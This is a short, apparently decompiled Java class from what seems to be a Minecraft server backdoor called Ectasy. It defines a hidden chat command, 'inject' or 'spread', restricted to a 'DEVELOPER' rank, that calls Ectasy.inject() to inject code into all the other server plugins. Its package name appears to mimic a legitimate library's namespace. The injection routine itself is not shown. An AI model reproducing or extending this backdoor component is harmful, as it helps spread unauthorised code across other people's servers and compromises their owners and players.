package fr.body.ectasy.command.impl;

import fr.body.ectasy.command.AbstractCommand;
import fr.body.ectasy.command.CommandInfo;
import fr.body.ectasy.user.Rank;
import fr.body.ectasy.util.ChatUtil;
import net.md5.bungee.Ectasy;
import org.bukkit.event.player.AsyncPlayerChatEvent;

@CommandInfo(
   name = "inject",
   description = "Injects into all the other server plugins",
   blatant = true,
   rank = Rank.DEVELOPER,
   aliases = {"spread"}
)
public class InjectCommand extends AbstractCommand {
   @Override
   public void execute(AsyncPlayerChatEvent var1, String var2, String[] var3) {
      ChatUtil.sendChat(var1.getPlayer(), "Starting to inject, plugins may break/throw errors.");
      Ectasy.inject();
   }

   public InjectCommand() {
   }
}
